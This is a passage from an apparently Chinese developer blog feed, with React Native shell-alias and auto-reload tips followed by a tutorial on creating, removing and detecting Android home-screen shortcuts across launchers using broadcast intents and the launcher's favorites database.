<p>然后再次呼出菜单，点击 【Reload JS】 刷新下界面，此时界面中的<code>Hello World!</code> 就变成了 <code>Hello HaHack!</code> ：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native_8.png" alt=""></p>
<h1 id="u5C0F_u6280_u5DE7"><a href="#u5C0F_u6280_u5DE7" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="u6DFB_u52A0_Alias"><a href="#u6DFB_u52A0_Alias" class="headerlink" title="添加 Alias"></a>添加 Alias</h2><p>React Native 运行一个 App 的命令有点长，可以为其编写一些 Alias ，节省时间，方便记忆。将下面两行代码添加到你的 Shell 配置文件中（<code>.bashrc</code> 或 <code>.zshrc</code>）：<br><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alias</span> <span class="title">rna</span>=<span class="string">"react-native run-android"</span></span><br><span class="line"><span class="keyword">alias</span> <span class="title">rni</span>=<span class="string">"react-native run-ios"</span></span><br></pre></td></tr></table></figure></p>
<p>完成后重新打开终端，即可使用 <code>rna</code> 命令运行 React Native for Android 项目，用 <code>rni</code> 命令运行 React Native for iOS 项目。</p>
<h2 id="u81EA_u52A8_u5237_u65B0_u754C_u9762"><a href="#u81EA_u52A8_u5237_u65B0_u754C_u9762" class="headerlink" title="自动刷新界面"></a>自动刷新界面</h2><p>如果希望每次修改 JS 脚本后自动刷新应用的界面，可以再次进入应用的选项界面，把 【Auto reload on JS Change】 选项打开：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/react-native_9.png" alt=""></p>
<p>这样当 watchman 发现你的 JS 文件发生更改时，就会让 Running Packager 重新加载应用的界面。</p>
]]></content>
    <summary type="html">
    <![CDATA[之前试过用ionic做开发，心想开发速度快一套顶多套，省事，完事了才发现是个坑，果断放弃，fb出了React Native总不至于又坑吧，先来试试水。]]>
    
    </summary>
    
      <category term="新技术试水" scheme="http://www.xuanzhangjiong.xyz/tags/%E6%96%B0%E6%8A%80%E6%9C%AF%E8%AF%95%E6%B0%B4/"/>
    
      <category term="React Native" scheme="http://www.xuanzhangjiong.xyz/categories/React-Native/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Android快捷方式解密]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/11/18/Android%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E8%A7%A3%E5%AF%86/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/11/18/Android快捷方式解密/</id>
    <published>2015-11-18T08:20:14.000Z</published>
    <updated>2016-01-08T10:36:38.000Z</updated>
    <content type="html"><![CDATA[<h1 id="Android_u5FEB_u6377_u65B9_u5F0F_u89E3_u5BC6"><a href="#Android_u5FEB_u6377_u65B9_u5F0F_u89E3_u5BC6" class="headerlink" title="Android快捷方式解密"></a>Android快捷方式解密</h1><p>Android快捷方式作为Android设备的杀手锏技能，一直都是非常重要的一个功能，也正是如此，各种流氓App也不断通过快捷方式霸占着这样一个用户入口。</p>
<p>同时，各大国产ROM和Luncher的崛起，让这个桌面之争变的更加激烈。毕竟大家都只想用户用自己的App资源，所以，现在各大App不仅仅是要抢占入口，同时还要和各大ROM斗智斗勇。本文将对这个快捷方式进行深度解密，同时给出App适配各种ROM的整合方案。</p>
<p>本文很多地方参考了这位朋友的实现：</p>
<p><a href="https://gist.github.com/waylife/437a3d98a84f245b9582" target="_blank" rel="external">https://gist.github.com/waylife/437a3d98a84f245b9582</a></p>
<p>特此表示感谢！</p>
<h1 id="u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F_u4E4B_u2014_u2014_u5C11_u6797_u6D3E"><a href="#u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F_u4E4B_u2014_u2014_u5C11_u6797_u6D3E" class="headerlink" title="创建快捷方式之——少林派"></a>创建快捷方式之——少林派</h1><blockquote>
<p>所谓少林，是指系统正统的解决方法</p>
</blockquote>
<p>天下武功出少林，天下的快捷方式都是Google给的，我们先来看看如何使用Android系统提供的方式来使用Android的快捷方式。</p>
<blockquote>
<p>首先大家要知道各种Launcher的区别，原生的Launcher，是两层结构，桌面是快捷方式，而进去后的App列表是App的Launch Icon；而以小米为首的一帮ROM，参考iOS风格，将Launcher改为了一层，即直接显示Launch Icon。</p>
</blockquote>
<h1 id="u6743_u9650_u8BBE_u7F6E"><a href="#u6743_u9650_u8BBE_u7F6E" class="headerlink" title="权限设置"></a>权限设置</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加快捷方式 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="title">uses-permission</span> <span class="attribute">android:name</span>=<span class="value">"com.android.launcher.permission.INSTALL_SHORTCUT"</span> /&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 移除快捷方式 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="title">uses-permission</span> <span class="attribute">android:name</span>=<span class="value">"com.android.launcher.permission.UNINSTALL_SHORTCUT"</span> /&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 查询快捷方式 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="title">uses-permission</span> <span class="attribute">android:name</span>=<span class="value">"com.android.launcher.permission.READ_SETTINGS"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F"><a href="#u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F" class="headerlink" title="创建快捷方式"></a>创建快捷方式</h1><p>创建快捷方式的Action：</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Action 添加Shortcut</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> ACTION_ADD_SHORTCUT = <span class="string">"com.android.launcher.action.INSTALL_SHORTCUT"</span>;</span><br></pre></td></tr></table></figure>
<p>通过广播创建快捷方式：<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * 添加快捷方式</span><br><span class="line"> *</span><br><span class="line"> * <span class="doctag">@param</span> context      context</span><br><span class="line"> * <span class="doctag">@param</span> actionIntent 要启动的Intent</span><br><span class="line"> * <span class="doctag">@param</span> name         name</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">void</span> <span class="title">addShortcut</span><span class="params">(Context context, Intent actionIntent, String name,</span><br><span class="line">                               <span class="keyword">boolean</span> allowRepeat, Bitmap iconBitmap)</span> </span>&#123;</span><br><span class="line">    Intent addShortcutIntent = <span class="keyword">new</span> Intent(ACTION_ADD_SHORTCUT);</span><br><span class="line">    <span class="comment">// 是否允许重复创建</span></span><br><span class="line">    addShortcutIntent.putExtra(<span class="string">"duplicate"</span>, allowRepeat);</span><br><span class="line">    <span class="comment">// 快捷方式的标题</span></span><br><span class="line">    addShortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);</span><br><span class="line">    <span class="comment">// 快捷方式的图标</span></span><br><span class="line">    addShortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON, iconBitmap);</span><br><span class="line">    <span class="comment">// 快捷方式的动作</span></span><br><span class="line">    addShortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, actionIntent);</span><br><span class="line">    context.sendBroadcast(addShortcutIntent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>参数相信大家都能看得懂，只是有一点需要注意的，duplicate这个属性，是设置该快捷方式是否允许多次创建的属性，但是，在很多ROM上都不能成功识别，嗯，这就是我们最开始说的快捷方式乱现象。</p>
<h1 id="u5220_u9664_u5FEB_u6377_u65B9_u5F0F"><a href="#u5220_u9664_u5FEB_u6377_u65B9_u5F0F" class="headerlink" title="删除快捷方式"></a>删除快捷方式</h1><p>删除快捷方式的Action：</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Action 移除Shortcut</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">String</span> ACTION_REMOVE_SHORTCUT = <span class="string">"com.android.launcher.action.UNINSTALL_SHORTCUT"</span>;</span><br></pre></td></tr></table></figure>
<p>通过广播删除快捷方式：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">   <span class="keyword">*</span> 移除快捷方式</span><br><span class="line">   <span class="keyword">*</span></span><br><span class="line">   <span class="keyword">*</span> <span class="comment">@param context      context</span></span><br><span class="line">   <span class="keyword">*</span> <span class="comment">@param actionIntent 要启动的Intent</span></span><br><span class="line">   <span class="keyword">*</span> <span class="comment">@param name         name</span></span><br><span class="line">   <span class="keyword">*</span>/</span><br><span class="line">  public static void removeShortcut(Context context, Intent actionIntent, String name) &#123;</span><br><span class="line">      Intent intent = new Intent(ACTION_REMOVE_SHORTCUT);</span><br><span class="line">      intent.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);</span><br><span class="line">//        intent.addCategory(Intent.CATEGORY_LAUNCHER);</span><br><span class="line">      intent.putExtra(<span class="string">"duplicate"</span>, false);</span><br><span class="line">      intent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, actionIntent);</span><br><span class="line">      context.sendBroadcast(intent);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>参数与创建快捷方式的方法基本类似，需要注意的是，Intent.EXTRA_SHORTCUT_INTENT，与之前创建快捷方式的Intent必须要是同一个，不然是无法删除快捷方式的。</p>
<h1 id="u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F_u4E4B_u2014_u2014_u900D_u9065_u6D3E"><a href="#u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F_u4E4B_u2014_u2014_u900D_u9065_u6D3E" class="headerlink" title="创建快捷方式之——逍遥派"></a>创建快捷方式之——逍遥派</h1><blockquote>
<p>所谓逍遥派，是指我们从原理来理解如何来适配各种Launcher。</p>
</blockquote>
<p>原生的快捷方式添加方法，虽然是官方提供的，但在天国这样一个怎么说呢的国家里，基本是很难使用、适配的，也就是我们最开始说的那些原因。下面我们先从快捷方式的整个生命周期来了解下产生、添加、删除快捷方式的原理，再来思考如何实现多ROM、Launcher的适配。</p>
<h1 id="u5FEB_u6377_u65B9_u5F0F_u7684_u5B58_u50A8"><a href="#u5FEB_u6377_u65B9_u5F0F_u7684_u5B58_u50A8" class="headerlink" title="快捷方式的存储"></a>快捷方式的存储</h1><p>快捷方式其实都存储在Launcher的数据库中，我们在手机上打开SQLite Editor打开Launcher的数据库。<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/Android%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F1.jpeg" alt=""></p>
<p>我们打开Launcher.db的favorite表，这里就是我们保存的快捷方式数据：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/Android%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F2.jpeg" alt=""></p>
<p>几个主要的字段大家基本一看就懂：title、intent、iconResource、icon，分别对应快捷方式名称，快捷方式intent，快捷方式图标来源，快捷方式图标二进制数据。</p>
<h1 id="u5FEB_u6377_u65B9_u5F0F_u7684_u521B_u5EFA"><a href="#u5FEB_u6377_u65B9_u5F0F_u7684_u521B_u5EFA" class="headerlink" title="快捷方式的创建"></a>快捷方式的创建</h1><p>了解了快捷方式的存储原理，我们就可以针对这个数据库来做文章，所有的快捷方式都可以通过修改这个数据库来实现，同时还不用太考虑兼容性问题。</p>
<p>对于快捷方式的创建，我们依然可以使用系统提供的方法，所以这里不再多说。</p>
<h1 id="u5FEB_u6377_u65B9_u5F0F_u7684_u5224_u65AD_u662F_u5426_u5B58_u5728"><a href="#u5FEB_u6377_u65B9_u5F0F_u7684_u5224_u65AD_u662F_u5426_u5B58_u5728" class="headerlink" title="快捷方式的判断是否存在"></a>快捷方式的判断是否存在</h1><p>前面我们说了，通过duplicate属性可以区分是否允许创建重复的快捷方式，但是，很多ROM是无法兼容到的，所以，这里我们使用查询Launcher数据库的方式来实现。</p>
<p>我们先来看代码：</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">    * 检查快捷方式是否存在 &lt;br/&gt;</span><br><span class="line">    * &lt;font color=red&gt;注意：&lt;/font&gt; 有些手机无法判断是否已经创建过快捷方式&lt;br/&gt;</span><br><span class="line">    * 因此，在创建快捷方式时，请添加&lt;br/&gt;</span><br><span class="line">    * shortcutIntent.putExtra(<span class="string">"duplicate"</span>, <span class="literal">false</span>);// 不允许重复创建&lt;br/&gt;</span><br><span class="line">    * 最好使用&#123;@link <span class="comment">#isShortCutExist(Context, String, Intent)&#125;</span></span><br><span class="line">    * 进行判断，因为可能有些应用生成的快捷方式名称是一样的的&lt;br/&gt;</span><br><span class="line">    */</span><br><span class="line">   public <span class="keyword">static</span> boolean isShortCutExist(<span class="type">Context</span> context, <span class="type">String</span> title) &#123;</span><br><span class="line">       boolean <span class="literal">result</span> = <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">ContentResolver</span> cr = context.getContentResolver();</span><br><span class="line">           <span class="type">Uri</span> uri = getUriFromLauncher(context);</span><br><span class="line">           <span class="type">Cursor</span> c = cr.query(uri, new <span class="type">String</span>[]&#123;<span class="string">"title"</span>&#125;, <span class="string">"title=? "</span>, new <span class="type">String</span>[]&#123;title&#125;, null);</span><br><span class="line">           <span class="keyword">if</span> (c != null &amp;&amp; c.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="literal">result</span> = <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (c != null &amp;&amp; !c.isClosed()) &#123;</span><br><span class="line">               c.close();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (<span class="type">Exception</span> e) &#123;</span><br><span class="line">           <span class="literal">result</span> = <span class="literal">false</span>;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /**</span><br><span class="line">    * 不一定所有的手机都有效，因为国内大部分手机的桌面不是系统原生的&lt;br/&gt;</span><br><span class="line">    * 更多请参考&#123;@link <span class="comment">#isShortCutExist(Context, String)&#125;&lt;br/&gt;</span></span><br><span class="line">    * 桌面有两种，系统桌面(<span class="type">ROM</span>自带)与第三方桌面，一般只考虑系统自带&lt;br/&gt;</span><br><span class="line">    * 第三方桌面如果没有实现系统响应的方法是无法判断的，比如<span class="type">GO</span>桌面&lt;br/&gt;</span><br><span class="line">    */</span><br><span class="line">   public <span class="keyword">static</span> boolean isShortCutExist(<span class="type">Context</span> context, <span class="type">String</span> title, <span class="type">Intent</span> intent) &#123;</span><br><span class="line">       boolean <span class="literal">result</span> = <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">ContentResolver</span> cr = context.getContentResolver();</span><br><span class="line">           <span class="type">Uri</span> uri = getUriFromLauncher(context);</span><br><span class="line">           <span class="type">Cursor</span> c = cr.query(uri, new <span class="type">String</span>[]&#123;<span class="string">"title"</span>, <span class="string">"intent"</span>&#125;, <span class="string">"title=?  and intent=?"</span>,</span><br><span class="line">                   new <span class="type">String</span>[]&#123;title, intent.toUri(<span class="number">0</span>)&#125;, null);</span><br><span class="line">           <span class="keyword">if</span> (c != null &amp;&amp; c.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="literal">result</span> = <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (c != null &amp;&amp; !c.isClosed()) &#123;</span><br><span class="line">               c.close();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (<span class="type">Exception</span> ex) &#123;</span><br><span class="line">           <span class="literal">result</span> = <span class="literal">false</span>;</span><br><span class="line">           ex.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   private <span class="keyword">static</span> <span class="type">Uri</span> getUriFromLauncher(<span class="type">Context</span> context) &#123;</span><br><span class="line">       <span class="type">StringBuilder</span> uriStr = new <span class="type">StringBuilder</span>();</span><br><span class="line">       <span class="type">String</span> authority = <span class="type">LauncherUtil</span>.getAuthorityFromPermissionDefault(context);</span><br><span class="line">       <span class="keyword">if</span> (authority == null || authority.trim().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">           authority = <span class="type">LauncherUtil</span>.getAuthorityFromPermission(context, <span class="type">LauncherUtil</span>.getCurrentLauncherPackageName(context) + <span class="string">".permission.READ_SETTINGS"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       uriStr.append(<span class="string">"content://"</span>);</span><br><span class="line">       <span class="keyword">if</span> (<span class="type">TextUtils</span>.isEmpty(authority)) &#123;</span><br><span class="line">           <span class="type">int</span> sdkInt = android.os.<span class="type">Build</span>.<span class="type">VERSION</span>.<span class="type">SDK_INT</span>;</span><br><span class="line">           <span class="keyword">if</span> (sdkInt &lt; <span class="number">8</span>) &#123; // <span class="type">Android</span> <span class="number">2</span>.<span class="number">1</span>.x(<span class="type">API</span> <span class="number">7</span>)以及以下的</span><br><span class="line">               uriStr.append(<span class="string">"com.android.launcher.settings"</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sdkInt &lt; <span class="number">19</span>) &#123;// <span class="type">Android</span> <span class="number">4</span>.<span class="number">4</span>以下</span><br><span class="line">               uriStr.append(<span class="string">"com.android.launcher2.settings"</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;// <span class="number">4</span>.<span class="number">4</span>以及以上</span><br><span class="line">               uriStr.append(<span class="string">"com.android.launcher3.settings"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           uriStr.append(authority);</span><br><span class="line">       &#125;</span><br><span class="line">       uriStr.append(<span class="string">"/favorites?notify=true"</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="type">Uri</span>.parse(uriStr.toString());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里有两个重载的isShortCutExist方法，唯一的区别就是最后一个参数——intent，加这个参数的原因，在注释中已经写了，更加精确。而getUriFromLauncher方法，是给调用的ContentResolver提供Uri。构造的时候，可以看见，Android的版本话碎片问题，是多么的严重……</p>
<p>这样在添加快捷方式前，通过这个判断下，就可以只添加一个快捷方式了。</p>
<h1 id="u4E3A_u4EFB_u610FPackageName_u7684App_u6DFB_u52A0_u5FEB_u6377_u65B9_u5F0F"><a href="#u4E3A_u4EFB_u610FPackageName_u7684App_u6DFB_u52A0_u5FEB_u6377_u65B9_u5F0F" class="headerlink" title="为任意PackageName的App添加快捷方式"></a>为任意PackageName的App添加快捷方式</h1><p>知道了我们是如何判断快捷方式是是否存在的，我们就可以通过这种思路来为任意PackageName的App添加快捷方式，代码如下：</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line">     * 为PackageName的App添加快捷方式</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> context context</span><br><span class="line">     * <span class="doctag">@param</span> pkg     待添加快捷方式的应用包名</span><br><span class="line">     * <span class="doctag">@return</span> 返回true为正常执行完毕</span><br><span class="line">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> addShortcutByPackageName(Context context, String pkg) &#123;</span><br><span class="line">        <span class="comment">// 快捷方式名</span></span><br><span class="line">        String title = <span class="string">"unknown"</span>;</span><br><span class="line">        <span class="comment">// MainActivity完整名</span></span><br><span class="line">        String mainAct = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 应用图标标识</span></span><br><span class="line">        <span class="keyword">int</span> iconIdentifier = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 根据包名寻找MainActivity</span></span><br><span class="line">        PackageManager pkgMag = context.getPackageManager();</span><br><span class="line">        Intent queryIntent = <span class="keyword">new</span> Intent(Intent.ACTION_MAIN, <span class="keyword">null</span>);</span><br><span class="line">        queryIntent.addCategory(Intent.CATEGORY_LAUNCHER);<span class="comment">// 重要，添加后可以进入直接已经打开的页面</span></span><br><span class="line">        queryIntent.setFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);</span><br><span class="line">        queryIntent.addFlags(Intent.FLAG_ACTIVITY_LAUNCHED_FROM_HISTORY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">List</span>&lt;ResolveInfo&gt; <span class="keyword">list</span> = pkgMag.queryIntentActivities(queryIntent,</span><br><span class="line">                PackageManager.GET_ACTIVITIES);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">list</span>.size(); i++) &#123;</span><br><span class="line">            ResolveInfo info = <span class="keyword">list</span>.get(i);</span><br><span class="line">            <span class="keyword">if</span> (info.activityInfo.packageName.equals(pkg)) &#123;</span><br><span class="line">                title = info.loadLabel(pkgMag).toString();</span><br><span class="line">                mainAct = info.activityInfo.name;</span><br><span class="line">                iconIdentifier = info.activityInfo.applicationInfo.icon;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (mainAct == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 没有启动类</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Intent shortcut = <span class="keyword">new</span> Intent(</span><br><span class="line">                <span class="string">"com.android.launcher.action.INSTALL_SHORTCUT"</span>);</span><br><span class="line">        <span class="comment">// 快捷方式的名称</span></span><br><span class="line">        shortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, title);</span><br><span class="line">        <span class="comment">// 不允许重复创建</span></span><br><span class="line">        shortcut.putExtra(<span class="string">"duplicate"</span>, <span class="keyword">false</span>);</span><br><span class="line">        ComponentName comp = <span class="keyword">new</span> ComponentName(pkg, mainAct);</span><br><span class="line">        shortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT,</span><br><span class="line">                queryIntent.setComponent(comp));</span><br><span class="line">        <span class="comment">// 快捷方式的图标</span></span><br><span class="line">        Context pkgContext = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (context.getPackageName().equals(pkg)) &#123;</span><br><span class="line">            pkgContext = context;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 创建第三方应用的上下文环境，为的是能够根据该应用的图标标识符寻找到图标文件。</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                pkgContext = context.createPackageContext(pkg,</span><br><span class="line">                        Context.CONTEXT_IGNORE_SECURITY</span><br><span class="line">                                | Context.CONTEXT_INCLUDE_CODE);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pkgContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Intent.ShortcutIconResource iconRes = Intent.ShortcutIconResource</span><br><span class="line">                    .fromContext(pkgContext, iconIdentifier);</span><br><span class="line">            shortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, iconRes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 发送广播，让接收者创建快捷方式</span></span><br><span class="line">        <span class="comment">// 需权限&lt;uses-permission</span></span><br><span class="line">        <span class="comment">// android:name="com.android.launcher.permission.INSTALL_SHORTCUT" /&gt;</span></span><br><span class="line">        context.sendBroadcast(shortcut);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F_u4E4B_u2014_u2014_u661F_u5BBF_u6D3E"><a href="#u521B_u5EFA_u5FEB_u6377_u65B9_u5F0F_u4E4B_u2014_u2014_u661F_u5BBF_u6D3E" class="headerlink" title="创建快捷方式之——星宿派"></a>创建快捷方式之——星宿派</h1><p>所谓星宿派，是指我们使用一些Trick来解决多Launcher适配的问题。</p>
<p>由于快捷方式的碎片化非常严重，所以，你顾得上这种ROM，顾不上其它ROM。例如，在原生ROM上，你需要使用类似原生的Launcher权限：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher.permission.INSTALL_SHORTCUT"</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="property">name</span>=<span class="string">"com.android.launcher.permission.UNINSTALL_SHORTCUT"</span> /&gt;</span><br></pre></td></tr></table></figure>
